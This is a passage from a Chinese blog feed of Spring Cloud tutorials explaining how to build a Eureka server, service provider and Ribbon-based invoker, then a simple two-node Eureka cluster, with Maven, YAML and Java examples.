<p>注解@EnableEurekaServer说明当前是一个Eureka的服务器。执行当前的main方法，待应用启动完全之后，就可以在本地的8080端口，看到启动后的页面了。</p>
<p><img src="https://huhansi.github.io/images/2020-04-23-eureka2.png" alt="Eureka启动后的页面"></p>
<p>如果要修改默认的8080端口的话，在resource目录下，新建一个配置application.yml或者application.properties文件，在里面设置即可。这里以yml文件为例：</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">eureka:</span></span><br><span class="line">  <span class="attr">client:</span></span><br><span class="line">    <span class="attr">register-with-eureka:</span> <span class="literal">false</span></span><br><span class="line">    <span class="attr">fetch-registry:</span> <span class="literal">false</span></span><br><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">8761</span></span><br></pre></td></tr></table></figure>

<p>这里还有两个配置register-with-eureka和fetch-registry。</p>
<ul>
<li>register-with-eureka：表示是否将自己的信息注册到Eureka服务器。默认为true。这里的Eureka仅作为服务器使用，不做客户端，因此设置为false</li>
<li>fetch-registry：表示是否到Eureka服务器中抓取注册信息。这里的Eureka仅作为服务器使用，不做客户端，因此设置为false</li>
</ul>
<h2 id="搭建服务提供者"><a href="#搭建服务提供者" class="headerlink" title="搭建服务提供者"></a>搭建服务提供者</h2><p>新建一个first-ek-service-provider的maven项目，在pom文件中添加如下依赖：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencyManagement</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-dependencies<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">version</span>&gt;</span>Dalston.SR1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">type</span>&gt;</span>pom<span class="tag">&lt;/<span class="name">type</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">scope</span>&gt;</span>import<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">dependencyManagement</span>&gt;</span></span><br><span class="line"></span><br><span class="line">	<span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-config<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-eureka<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>启动类代码如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="meta">@EnableEurekaClient</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FirstServiceProvider</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">new</span> SpringApplicationBuilder(FirstServiceProvider<span class="class">.<span class="keyword">class</span>).<span class="title">run</span>(<span class="title">args</span>)</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个类中使用了EnableEurekaClient注解，表示这个工程是一个Eureka客户端应用。启动配置项如下：</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">application:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">first-service-provider</span></span><br><span class="line"><span class="attr">eureka:</span></span><br><span class="line">  <span class="attr">instance:</span></span><br><span class="line">    <span class="attr">hostname:</span> <span class="string">localhost</span></span><br><span class="line">  <span class="attr">client:</span></span><br><span class="line">    <span class="attr">serviceUrl:</span></span><br><span class="line">      <span class="attr">defaultZone:</span> <span class="string">http://localhost:8761/eureka/</span></span><br><span class="line"><span class="attr">logging:</span></span><br><span class="line">  <span class="attr">level:</span></span><br><span class="line">    <span class="attr">com.netflix:</span> <span class="string">INFO</span></span><br></pre></td></tr></table></figure>

<p>以上配置，通过application.name字段，将应用的名称设置为first-service-provider，通过eureka.instance.hostname配置应用的主机名称。通过eureck.client.serviceUrl.defaultZone配置服务需要注册到的服务器。</p>
<p>通过上面的配置，first-service-provider启动之后就可以注册在启动的Eureka服务器中了。</p>
<p><img src="https://huhansi.github.io/images/2020-04-23-eureka3.png" alt="注册在Eureka服务器上的服务"></p>
<p>为了演示用，再提供一个REST接口做服务调用演示用。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FirstController</span> </span>&#123;</span><br><span class="line">	</span><br><span class="line">	<span class="meta">@RequestMapping</span>(value = <span class="string">"/person/&#123;personId&#125;"</span>, method = RequestMethod.GET, </span><br><span class="line">			produces = MediaType.APPLICATION_JSON_VALUE)</span><br><span class="line">	<span class="function"><span class="keyword">public</span> Person <span class="title">findPerson</span><span class="params">(@PathVariable(<span class="string">"personId"</span>)</span> Integer personId) </span>&#123;</span><br><span class="line">		Person person = <span class="keyword">new</span> Person(personId, <span class="string">"Crazyit"</span>, <span class="number">30</span>);</span><br><span class="line">		<span class="keyword">return</span> person;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Person-Bean"><a href="#Person-Bean" class="headerlink" title="Person Bean"></a>Person Bean</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">private</span> Integer id;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">private</span> String name;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">private</span> Integer age;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="title">Person</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">super</span>();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="title">Person</span><span class="params">(Integer id, String name, Integer age)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">super</span>();</span><br><span class="line">		<span class="keyword">this</span>.id = id;</span><br><span class="line">		<span class="keyword">this</span>.name = name;</span><br><span class="line">		<span class="keyword">this</span>.age = age;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> Integer <span class="title">getId</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> id;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setId</span><span class="params">(Integer id)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">this</span>.id = id;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> name;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">this</span>.name = name;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> Integer <span class="title">getAge</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> age;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAge</span><span class="params">(Integer age)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">this</span>.age = age;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="搭建服务调用者"><a href="#搭建服务调用者" class="headerlink" title="搭建服务调用者"></a>搭建服务调用者</h2><p>服务被注册、发布到Eureka服务器后，需要有程序去发现它，并且进行调用。此处所说的调用者，是指同样注册到Eureka的客户端，来调用其他客户端发布的任务。</p>
<p>新建名为first-ek-service-invoker项目，它的pom依赖如下：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencyManagement</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-dependencies<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">version</span>&gt;</span>Dalston.SR1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">type</span>&gt;</span>pom<span class="tag">&lt;/<span class="name">type</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">scope</span>&gt;</span>import<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencyManagement</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-config<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-eureka<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-ribbon<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>配置文件配置如下，同样将其注册到Eureka的服务器上：</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">9000</span></span><br><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">application:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">first-service-invoker</span></span><br><span class="line"><span class="attr">eureka:</span></span><br><span class="line">  <span class="attr">instance:</span></span><br><span class="line">    <span class="attr">hostname:</span> <span class="string">localhost</span></span><br><span class="line">  <span class="attr">client:</span></span><br><span class="line">    <span class="attr">serviceUrl:</span></span><br><span class="line">      <span class="attr">defaultZone:</span> <span class="string">http://localhost:8761/eureka</span></span><br></pre></td></tr></table></figure>

<p>而后，对外提供一个REST服务供客户端调用，这个REST服务又通过Eureka服务器，获取要调用的服务的地址，产生调用。调用流程如下：</p>
<p><img src="https://huhansi.github.io/images/2020-04-23-eureka4.png" alt="调用流程"></p>
<p>Invoker对外提供的REST服务代码如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">InvokerController</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="meta">@LoadBalanced</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> RestTemplate <span class="title">getRestTemplate</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> RestTemplate();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping</span>(value = <span class="string">"/router"</span>, method = RequestMethod.GET, produces = MediaType.APPLICATION_JSON_VALUE)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">router</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        RestTemplate template = getRestTemplate();</span><br><span class="line">        String json = template.getForObject(<span class="string">"http://first-service-provider/person/1"</span>, String<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">        <span class="keyword">return</span> json;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>启动类：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="meta">@EnableDiscoveryClient</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FirstInvoker</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        SpringApplication.run(FirstInvoker<span class="class">.<span class="keyword">class</span>, <span class="title">args</span>)</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>注解EnableDiscoveryClient使服务有能力去Eureka中发现服务。需要注意的是EnableEurekaClient注解已经包含了EnableDiscoveryClient的功能，也就是说，一个Eureka客户端，本身就具有发现服务的能力。</p>
<p>启动invoker后，就能在Eureka的控制台页面上看到，注册的invoker了。</p>
<p><img src="https://huhansi.github.io/images/2020-04-23-eureka5.png" alt="调用流程"></p>
<p>然后，在浏览器中打开如下接口<a href="http://localhost:9000/router，可以看到，成功返回了数据。" target="_blank" rel="noopener">http://localhost:9000/router，可以看到，成功返回了数据。</a></p>
<p><img src="https://huhansi.github.io/images/2020-04-23-eureka6.png" alt="调用"></p>
<p>再看看invoker的日志，</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">2020-04-23 16:40:42.456  INFO 16740 --- [nio-9000-exec-3] c.n.l.DynamicServerListLoadBalancer      : DynamicServerListLoadBalancer for client first-service-provider initialized: DynamicServerListLoadBalancer:&#123;NFLoadBalancer:name&#x3D;first-service-provider,current list of Servers&#x3D;[localhost:8080],Load balancer stats&#x3D;Zone stats: &#123;defaultzone&#x3D;[Zone:defaultzone;	Instance count:1;	Active connections count: 0;	Circuit breaker tripped count: 0;	Active connections per server: 0.0;]</span><br><span class="line">&#125;,Server stats: [[Server:localhost:8080;	Zone:defaultZone;	Total Requests:0;	Successive connection failure:0;	Total blackout seconds:0;	Last connection made:Thu Jan 01 08:00:00 CST 1970;	First connection made: Thu Jan 01 08:00:00 CST 1970;	Active Connections:0;	total failure count in last (1000) msecs:0;	average resp time:0.0;	90 percentile resp time:0.0;	95 percentile resp time:0.0;	min resp time:0.0;	max resp time:0.0;	stddev resp time:0.0]</span><br><span class="line">]&#125;ServerList:org.springframework.cloud.netflix.ribbon.eureka.DomainExtractingServerList@6ee6facf</span><br></pre></td></tr></table></figure>

<p>可以看到，它是通过服务名称<code>first-service-provider</code>来获取服务列表<code>current list of Servers=[localhost:8080]</code>，然后再发起调用的。</p>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href>疯狂Spring Cloud微服务架构实战</a></p>
]]></content>
      <categories>
        <category>Spring Cloud</category>
      </categories>
      <tags>
        <tag>Eureka</tag>
      </tags>
  </entry>
  <entry>
    <title>搭建一个简单的Eureka集群</title>
    <url>/2020/04/23/SpringCloud/2020-04-23-007-%E6%90%AD%E5%BB%BA%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84Eureka%E9%9B%86%E7%BE%A4/</url>
    <content><![CDATA[<h1 id="搭建一个简单的Eureka集群"><a href="#搭建一个简单的Eureka集群" class="headerlink" title="搭建一个简单的Eureka集群"></a>搭建一个简单的Eureka集群</h1><p>现在我们稍微把上一篇文章中的Eureka应用扩展一下，扩展成一个简单的Eureka集群。架构图如下所示：</p>
<p><img src="https://huhansi.github.io/images/2020-04-23-eureka7.png" alt="集群部署图"></p>
<p>我们要部署两台Eureka服务器，两台ServiceProvider。为此，首先要修改本机的Hosts文件，以便在一台机子上模拟出多台的效果。</p>
<p><img src="https://huhansi.github.io/images/2020-04-23-hosts.png" alt="修改hosts文件"></p>
<h2 id="Eureka-Server端"><a href="#Eureka-Server端" class="headerlink" title="Eureka Server端"></a>Eureka Server端</h2><p>新建maven项目first-cloud-server，其pom依赖如下：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencyManagement</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-dependencies<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">version</span>&gt;</span>Dalston.SR1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">type</span>&gt;</span>pom<span class="tag">&lt;/<span class="name">type</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">scope</span>&gt;</span>import<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencyManagement</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-eureka-server<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>我们通过启动时指定启动哪个server，server1还是server2.这就需要在配置文件中配置不同的profile。</p>
<p>启动类如下所示，启动时需要从输入中读取需要启动的server（server1或server2）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@SpringBootApplication</span><br><span class="line">@EnableEurekaServer</span><br><span class="line">public class FirstCloudServer &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        Scanner scanner &#x3D; new Scanner(System.in);</span><br><span class="line">        String profiles &#x3D; scanner.nextLine();</span><br><span class="line">        new SpringApplicationBuilder(FirstCloudServer.class).profiles(profiles).run(args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>配置文件如下所示：</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">8761</span></span><br><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">application:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">first-cloud-server</span></span><br><span class="line">  <span class="attr">profiles:</span> <span class="string">server1</span></span><br><span class="line"><span class="attr">eureka:</span></span><br><span class="line">  <span class="attr">instance:</span></span><br><span class="line">    <span class="attr">hostname:</span> <span class="string">server1</span></span><br><span class="line">  <span class="attr">client:</span></span><br><span class="line">    <span class="attr">serverUrl:</span></span><br><span class="line">      <span class="attr">defaultZone:</span> <span class="string">http://server2:8762/eureka/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">8762</span></span><br><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">application:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">first-cloud-server</span></span><br><span class="line">  <span class="attr">profiles:</span> <span class="string">server2</span></span><br><span class="line"><span class="attr">eureka:</span></span><br><span class="line">  <span class="attr">instance:</span></span><br><span class="line">    <span class="attr">hostname:</span> <span class="string">server2</span></span><br><span class="line">  <span class="attr">client:</span></span><br><span class="line">    <span class="attr">serverUrl:</span></span><br><span class="line">      <span class="attr">defaultZone:</span> <span class="string">http://server1:8761/eureka/</span></span><br></pre></td></tr></table></figure>

<p>配置文件中通过profiles声明了两套server配置。它们在启动完之后，会互相注册</p>
<h2 id="Eureka-provider"><a href="#Eureka-provider" class="headerlink" title="Eureka provider"></a>Eureka provider</h2><p>新建Maven项目first-cloud-provider，其pom文件的依赖如下所示：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencyManagement</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-dependencies<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">version</span>&gt;</span>Dalston.SR1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">type</span>&gt;</span>pom<span class="tag">&lt;/<span class="name">type</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">scope</span>&gt;</span>import<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencyManagement</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-config<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-eureka<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>因为我们也是需要启动两台Provider，就通过启动的时候指定不同的端口实现。启动类如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="meta">@EnableEurekaClient</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FirstCloudServiceProvider</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Scanner scanner = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">        String port = scanner.nextLine();</span><br><span class="line">        new SpringApplicationBuilder(FirstCloudServiceProvider.class).properties("server.port=" + port).run(args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>启动完成之后，分别向两台Eureka Server注册，配置文件如下：</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">application:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">first-cloud-provider</span></span><br><span class="line"><span class="attr">eureka:</span></span><br><span class="line">  <span class="attr">instance:</span></span><br><span class="line">    <span class="attr">hostname:</span> <span class="string">localhost</span></span><br><span class="line">  <span class="attr">client:</span></span><br><span class="line">    <span class="attr">serviceUrl:</span></span><br><span class="line">      <span class="attr">defaultZone:</span> <span class="string">http://server1:8761/eureka/,http://server2:8762/eureka/</span></span><br></pre></td></tr></table></figure>

<p>我们还是对外提供了一个REST服务，代码如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FirstCloudController</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping</span>(value = <span class="string">"/person/&#123;personId&#125;"</span>, method = RequestMethod.GET,</span><br><span class="line">            produces = MediaType.APPLICATION_JSON_VALUE)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Person <span class="title">findPerson</span><span class="params">(@PathVariable(<span class="string">"personId"</span>)</span> Integer personId, HttpServletRequest request) </span>&#123;</span><br><span class="line">        Person person = <span class="keyword">new</span> Person(personId, <span class="string">"Crazyit"</span>, <span class="number">30</span>);</span><br><span class="line">        person.setMessage(request.getRequestURL().toString());</span><br><span class="line">        <span class="keyword">return</span> person;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>与之前单机部署不同的是，这次在返回中添加了请求的URL信息。</p>
<p>Person Bean如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Integer id;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Integer age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String message;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Person</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Person</span><span class="params">(Integer id, String name, Integer age)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>();</span><br><span class="line">        <span class="keyword">this</span>.id = id;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">   